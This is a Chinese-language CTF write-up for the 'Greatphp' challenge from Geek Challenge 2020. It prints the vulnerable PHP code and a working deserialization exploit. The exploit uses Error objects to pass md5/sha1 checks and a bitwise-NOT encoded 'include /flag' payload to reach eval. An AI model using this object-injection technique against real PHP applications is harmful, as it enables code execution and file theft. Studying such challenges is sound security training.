# [极客大挑战 2020]Greatphp



## 0、知识点

>   php反序列化

>   `md5()`和`sha1()`比较

>   Error/Exception 内置类绕过哈希比较



## 1、解题

原题代码

```php
<?php
error_reporting(0);

class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        // syc != lover and md5(syc) === md5(lover), syc = 数组，lover = 数组
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) 
        && (sha1($this->syc) === sha1($this->lover)) ){
           
            if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

```

>   这个乍看一眼在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过。
>
>   但是这里是**在类里面**，我们当然不能这么做

>   这里的考点是`md5()`和`sha1()`可以对一个类进行hash，并且会触发这个类的 `__toString` 方法；
>
>   且当`eval()`函数传入一个类对象时，也会触发这个类里的 `__toString` 方法。

>   所以我们可以使用含有 `__toString` 方法的PHP内置类来绕过，
>
>   用的两个比较多的内置类就是 `Exception` 和 `Error` ，
>
>   他们之中有一个 `__toString` 方法，**当类被当做字符串处理时**，就会调用这个函数

```js
<?php
    $a = new Error("payload",1);$b = new Error("payload",2);
    echo $a;
    echo "\r\n\r\n";
    echo $b;

结果：
Error: payload in D:\program_files\phpstudy_pro\WWW\test\index.php:9 Stack trace: #0 {main}
Error: payload in D:\program_files\phpstudy_pro\WWW\test\index.php:9 Stack trace: #0 {main}
```

>   可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的

>   绕过`preg_match()`，因为括号被过滤，所有无法调用函数，也无法使用引号
>
>   这时可以使用到`include /flag`，将文件包含进来

>   绕过引号的方式是使用 **url取反**

```php
class SYCLOVER {
    public $syc;
    public $lover;

}
// %D0%99%93%9E%98 === /flag
$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
/* 
或使用[~(取反)][!%FF]的形式，
即: $str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!.urldecode("%FF")."]?>";    
 
$str = "?><?=include $_GET[_]?>"; 
*/
$c = new SYCLOVER();
$a = new Error($str,1);$b = new Error($str,2);
$c->syc = $a;
$c->lover = $b;

echo urlencode(serialize($c));
```

>   这里 `$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";` 中为什么要在前面加上一个 `?>` 呢？
>
>   因为 `Exception` 类与 `Error` 的 `__toString` 方法在eval()函数中输出的结果是不可能控的，
>
>   输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：如下

```PHP
Error: payload in /var/www/html/tmp/test.php:2
Stack trace:
#0 {main}
```

>   进入`eval()`函数会类似于：`eval("...Error: <?php payload ?>")`。
>
>   所以我们要用 `?>` 来闭合一下，即 `eval("...Error: ?><?php payload ?>")`，这样我们的payload便能顺利执行了







参考：

https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/